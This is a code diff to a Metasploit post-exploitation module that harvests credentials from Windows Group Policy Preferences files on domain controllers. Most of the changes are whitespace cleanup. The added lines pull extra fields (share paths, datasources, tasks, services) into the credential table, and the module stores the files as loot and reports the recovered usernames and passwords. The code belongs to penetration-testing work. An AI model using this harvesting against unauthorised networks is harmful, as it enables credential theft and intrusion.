@@ -49,11 +49,9 @@ class Metasploit3 < Msf::Post
 			OptBool.new('ALL', [false, 'Enumerate all domains on network.', true]),
 			OptBool.new('STORE', [false, 'Store the enumerated files in loot.', true]),
 			OptString.new('DOMAINS', [false, 'Enumerate list of space seperated domains DOMAINS="dom1 dom2".'])], self.class)
-			
 	end
 
 	def run
-
 		group_path = "MACHINE\\Preferences\\Groups\\Groups.xml"
 		group_path_user = "USER\\Preferences\\Groups\\Groups.xml"
 		service_path = "MACHINE\\Preferences\\Services\\Services.xml"
@@ -76,7 +74,7 @@ class Metasploit3 < Msf::Post
 			print_good "Group Policy Files found locally"
 		end
 
-		# If user supplied domains this implicitly cancels the ALL flag. 
+		# If user supplied domains this implicitly cancels the ALL flag.
 		if datastore['ALL'] and datastore['DOMAINS'].blank?
 			print_status "Enumerating Domains on the Network..."
 			domains = enum_domains
@@ -90,14 +88,14 @@ class Metasploit3 < Msf::Post
 			print_status "Enumerating the user supplied Domain(s): #{user_domains.join(', ')}..."
 			user_domains.each{|ud| domains << ud}
 		end
-		
+
 		# If we find a local policy store then assume we are on DC and do not wish to enumerate the current DC again.
 		# If user supplied domains we do not wish to enumerate registry retrieved domains.
 		if locals.blank? && user_domains.blank?
 			print_status "Enumerating Domains in the local registry..."
 			domains << get_domain_reg
-		end	
-		
+		end
+
 		domains.flatten!
 		domains.compact!
 		domains.uniq!
@@ -164,7 +162,6 @@ class Metasploit3 < Msf::Post
 		return locals
 	end
 
-
 	def find_path(path, xml_path)
 		xml_path = "#{path}#{xml_path}"
 		begin
@@ -211,11 +208,25 @@ class Metasploit3 < Msf::Post
 
 			user = node.attributes['runAs'] if node.attributes['runAs']
 			user = node.attributes['accountName'] if node.attributes['accountName']
-			user = node.attributes['username'] if  node.attributes['username']
-			user = node.attributes['userName'] if  node.attributes['userName']
-			user = node.attributes['newName'] unless  node.attributes['newName'].blank?
+			user = node.attributes['username'] if node.attributes['username']
+			user = node.attributes['userName'] if node.attributes['userName']
+			user = node.attributes['newName'] unless node.attributes['newName'].blank?
 			changed = node.parent.attributes['changed']
 
+			# Printers and Shares
+			path = node.attributes['path']
+
+			# Datasources
+			dsn = node.attributes['dsn']
+			driver = node.attributes['driver']
+
+			# Tasks
+			app_name = node.attributes['appName']
+
+			# Services
+			service = node.attributes['serviceName']
+
+			# Groups
 			expires = node.attributes['expires']
 			never_expires = node.attributes['neverExpires']
 			disabled = node.attributes['acctDisabled']
@@ -223,7 +234,7 @@ class Metasploit3 < Msf::Post
 			table = Rex::Ui::Text::Table.new(
 				'Header'     => 'Group Policy Credential Info',
 				'Indent'     => 1,
-				'SortIndex'  => 5,
+				'SortIndex'  => -1,
 				'Columns'    =>
 				[
 					'Name',
@@ -231,7 +242,7 @@ class Metasploit3 < Msf::Post
 				]
 			)
 
-			table << ["Type", filetype]
+			table << ["TYPE", filetype]
 			table << ["USERNAME", user]
 			table << ["PASSWORD", pass]
 			table << ["DOMAIN CONTROLLER", xmlfile[:dc]]
@@ -240,22 +251,31 @@ class Metasploit3 < Msf::Post
 			table << ["EXPIRES", expires] unless expires.blank?
 			table << ["NEVER_EXPIRES?", never_expires] unless never_expires.blank?
 			table << ["DISABLED", disabled] unless disabled.blank?
+			table << ["PATH", path] unless path.blank?
+			table << ["DATASOURCE", dsn] unless dsn.blank?
+			table << ["DRIVER", driver] unless driver.blank?
+			table << ["TASK", app_name] unless app_name.blank?
+			table << ["SERVICE", service] unless service.blank?
+
+			node.elements.each('//Attributes//Attribute') do |dsn_attribute|
+				table << ["ATTRIBUTE", "#{dsn_attribute.attributes['name']} - #{dsn_attribute.attributes['value']}"]
+			end
 
 			print_good table.to_s
-			
+
 			store_data(xmlfile[:xml], filetype, xmlfile[:path])
-			
+
 			report_creds(user,pass) unless disabled and disabled == '1'
 		end
 	end
-	
+
 	def store_data(data, filename, path)
 		if datastore['STORE']
-			stored_path = store_loot('windows.gpp.xml', 'text/plain', session, data, filename, path)	
+			stored_path = store_loot('windows.gpp.xml', 'text/plain', session, data, filename, path)
 			print_status("XML file saved to: #{stored_path}")
-		end	
+		end
 	end
-			
+
 	def report_creds(user, pass)
 		if session.db_record
 			source_id = session.db_record.id
@@ -289,7 +309,6 @@ class Metasploit3 < Msf::Post
 
 		return pass
 	end
-
 
 	def enum_domains
 		domain_enum = 0x80000000 # SV_TYPE_DOMAIN_ENUM
@@ -329,7 +348,7 @@ class Metasploit3 < Msf::Post
 				domains << x[:domain]
 				base = base + 8
 		end
-		
+
 		domains.uniq!
 		print_status "Retrieved Domain(s) #{domains.join(', ')} from network"
 		return domains
@@ -373,9 +392,9 @@ class Metasploit3 < Msf::Post
 		locations << ["HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\", "DefaultDomainName"]
 		locations << ["HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\DomainCache", "DefaultDomainName"]
 		locations << ["HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History\\", "MachineDomain"]
-		
+
 		domains = []
-		
+
 		locations.each do |location|
 			begin
 				subkey = location[0]
@@ -386,11 +405,10 @@ class Metasploit3 < Msf::Post
 			end
 			domains << domain.split('.')[0].upcase unless domain.blank?
 		end
-		
+
 		domains.uniq!
-	    print_status "Retrieved Domain(s) #{domains.join(', ')} from registry"
-		
+		print_status "Retrieved Domain(s) #{domains.join(', ')} from registry"
+
 		return domains
 	end
-
 end
